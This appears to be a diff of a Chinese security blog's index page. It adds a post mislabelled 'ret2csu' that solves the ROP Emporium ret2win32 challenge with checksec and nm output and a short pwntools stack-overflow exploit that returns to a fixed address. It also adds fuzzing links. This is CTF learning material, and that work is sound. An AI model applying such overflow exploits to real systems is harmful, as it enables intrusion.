@@ -79,6 +79,106 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ROP之ret2csu" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/22/ROP%E4%B9%8Bret2csu/" class="article-date">
+  <time class="dt-published" datetime="2022-12-22T02:32:40.000Z" itemprop="datePublished">2022-12-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/12/22/ROP%E4%B9%8Bret2csu/">ROP之ret2csu</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+	
+        <p>以蒸米的<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007406442">一步一步学ROP之linux_x64篇</a>level5为例来学习。</p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230081632881.png" alt="image-20221230081632881"></p>
+<p>保护措施来看，并没有很多安全措施</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面]</span><br><span class="line">└─$ checksec --file=./ret2win32</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols        No    0               3               ./ret2win32</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>nm查看二进制信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nm ret2win|grep <span class="string">&#x27; t &#x27;</span></span><br><span class="line">08048490 t deregister_tm_clones</span><br><span class="line">08048510 t __do_global_dtors_aux</span><br><span class="line">08048540 t frame_dummy</span><br><span class="line">080485ad t pwnme</span><br><span class="line">080484d0 t register_tm_clones</span><br><span class="line"><span class="comment"># 此处有一个独特的函数</span></span><br><span class="line">0804862c t ret2win</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>r2</code>进行初步re，辅助查看</p>
+<p>pwnme函数中调用read，存在溢出点</p>
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230082028956.png" alt="image-20221230082028956"></p>
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230081146429.png" alt="image-20221230081146429"></p>
+<p>思路很清晰，栈溢出并能ret到<code>ret2win</code>地址</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win_addr = <span class="number">0x804862c</span></span><br><span class="line"><span class="comment"># 可使用msf-pattern_create msf-pattern_offset来确定padding</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span></span><br><span class="line">p += <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span></span><br><span class="line">p += p32(ret2win_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(p)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;flag:\n&#x27;</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以<a target="_blank" rel="noopener" href="https://ropemporium.com/">ROP系列</a>作为栈溢出学习点收尾，Stack over flow就告一段了。开启堆相关的内容😄</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/" data-id="clc8mkzpf0006js9y1std384b" data-title="ROP之ret2csu" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-ArmPwn初级" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/19/ArmPwn%E5%88%9D%E7%BA%A7/" class="article-date">
+  <time class="dt-published" datetime="2022-12-18T22:38:13.000Z" itemprop="datePublished">2022-12-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/12/19/ArmPwn%E5%88%9D%E7%BA%A7/">ArmPwn初级</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>CTF-WiKi上的一些练习</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/12/19/ArmPwn%E5%88%9D%E7%BA%A7/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/19/ArmPwn%E5%88%9D%E7%BA%A7/" data-id="clc8mkzp90001js9y47pr2sjc" data-title="ArmPwn初级" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
     <article id="post-Fuzzing技术文章整理" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/12/15/Fuzzing%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/" class="article-date">
@@ -108,14 +208,24 @@
 <p><a target="_blank" rel="noopener" href="https://lcamtuf.coredump.cx/afl/technical_details.txt">https://lcamtuf.coredump.cx/afl/technical_details.txt</a></p>
 <p>AFL简单使用</p>
 <p><a target="_blank" rel="noopener" href="https://0xfocu5.github.io/posts/2ba75ee3/">https://0xfocu5.github.io/posts/2ba75ee3/</a></p>
+<p>「afl++」fuzzing一个IoT二进制程序，文件fuzz</p>
+<p><a target="_blank" rel="noopener" href="https://blog.attify.com/fuzzing-iot-devices-part-1/">https://blog.attify.com/fuzzing-iot-devices-part-1/</a></p>
+<p>「afl++」如何fuzz网络程序</p>
+<p><a target="_blank" rel="noopener" href="https://blog.attify.com/fuzzing-iot-binaries-with-afl-part-ii/">https://blog.attify.com/fuzzing-iot-binaries-with-afl-part-ii/</a></p>
+<h3 id="Fuzzing技术综述"><a href="#Fuzzing技术综述" class="headerlink" title="Fuzzing技术综述"></a>Fuzzing技术综述</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/nREiT1Uj25igCMWu1kta9g">https://mp.weixin.qq.com/s/nREiT1Uj25igCMWu1kta9g</a></p>
+<p>无源fuzz，arm平台</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/G26MJOH4VPene1Sd_zjEQw">https://mp.weixin.qq.com/s/G26MJOH4VPene1Sd_zjEQw</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/230811#h2-3">https://www.anquanke.com/post/id/230811#h2-3</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/15/Fuzzing%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/" data-id="clbp9bn830000s29yh3ts6yfw" data-title="Fuzzing技术文章整理" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2022/12/15/Fuzzing%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/" data-id="clc8mkzpc0002js9yez8p22p1" data-title="Fuzzing技术文章整理" class="article-share-link">分享</a>
       
       
       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li></ul>
+
     </footer>
   </div>
   
@@ -174,7 +284,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/30/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%80%E8%A7%88/" data-id="clb32brhr0000fm9yhnhrdl4y" data-title="车联网渗透测试一览" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2022/11/30/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%80%E8%A7%88/" data-id="clc8mkzpl000jjs9ychdu8wpr" data-title="车联网渗透测试一览" class="article-share-link">分享</a>
       
       
       
@@ -220,7 +330,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/28/Android%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/" data-id="clb2qx3b50000d99ygja28f1a" data-title="Android抓包总结" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2022/11/28/Android%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/" data-id="clc8mkzpd0003js9yfjjb8lnq" data-title="Android抓包总结" class="article-share-link">分享</a>
       
       
       
@@ -266,7 +376,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/27/WP-HTB-Password-Cracking/" data-id="claz6ngpy0000w39ye0dcdy16" data-title="WP-HTB-Password Cracking" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2022/11/27/WP-HTB-Password-Cracking/" data-id="clc8mkzpk000ijs9y8pib8ds1" data-title="WP-HTB-Password Cracking" class="article-share-link">分享</a>
       
       
       
@@ -312,7 +422,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/27/MyLogs/" data-id="clay5rrpo0000ox9y8pomcmxj" data-title="MyLogs" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2022/11/27/MyLogs/" data-id="clc8mkzpf0005js9y5rjx1uam" data-title="MyLogs" class="article-share-link">分享</a>
       
       
       
@@ -358,7 +468,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/20/che%E6%99%BA%E8%B5%A2+App%E5%88%86%E6%9E%90/" data-id="clavghok80000cs9yadtp6ihb" data-title="che智赢+App分析" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2022/11/20/che%E6%99%BA%E8%B5%A2+App%E5%88%86%E6%9E%90/" data-id="clc8mkzpg0007js9y9tbcc5l2" data-title="che智赢+App分析" class="article-share-link">分享</a>
       
       
       
@@ -404,7 +514,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="clavfvcj90000nv9ydtnebas9" data-title="二进制分析入门（一）" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="clc8mkzpj000fjs9yhv4h76ic" data-title="二进制分析入门（一）" class="article-share-link">分享</a>
       
       
       
@@ -450,7 +560,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/02/%E7%81%B0%E8%A2%8D%E6%8E%A8%E9%80%81Mark/" data-id="clavey2s60001ou9y0ylo4om1" data-title="灰袍推送Mark" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2021/10/02/%E7%81%B0%E8%A2%8D%E6%8E%A8%E9%80%81Mark/" data-id="clc8mkzpk000gjs9ybh1bbf10" data-title="灰袍推送Mark" class="article-share-link">分享</a>
       
       
       
@@ -478,7 +588,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pentest/" rel="tag">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB/" rel="tag">生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E6%8A%80%E8%83%BD/" rel="tag">黑技能</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pentest/" rel="tag">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB/" rel="tag">生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E6%8A%80%E8%83%BD/" rel="tag">黑技能</a></li></ul>
     </div>
   </div>
 
@@ -488,7 +598,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/HTB/" style="font-size: 10px;">HTB</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" style="font-size: 10px;">二进制</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a> <a href="/tags/%E9%BB%91%E6%8A%80%E8%83%BD/" style="font-size: 10px;">黑技能</a>
+      <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/HTB/" style="font-size: 10px;">HTB</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" style="font-size: 10px;">二进制</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a> <a href="/tags/%E9%BB%91%E6%8A%80%E8%83%BD/" style="font-size: 10px;">黑技能</a>
     </div>
   </div>
 
@@ -510,6 +620,14 @@
       <ul>
         
           <li>
+            <a href="/2022/12/22/ROP%E4%B9%8Bret2csu/">ROP之ret2csu</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/19/ArmPwn%E5%88%9D%E7%BA%A7/">ArmPwn初级</a>
+          </li>
+        
+          <li>
             <a href="/2022/12/15/Fuzzing%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/">Fuzzing技术文章整理</a>
           </li>
         
@@ -519,14 +637,6 @@
         
           <li>
             <a href="/2022/11/28/Android%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/">Android抓包总结</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/27/WP-HTB-Password-Cracking/">WP-HTB-Password Cracking</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/27/MyLogs/">MyLogs</a>
           </li>
         
       </ul>
@@ -545,7 +655,7 @@
         <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a></br>
 All website licensed under <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></br>
       
-      &copy; 2022 尘埃落定<br>
+      &copy; 2023 尘埃落定<br>
       Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
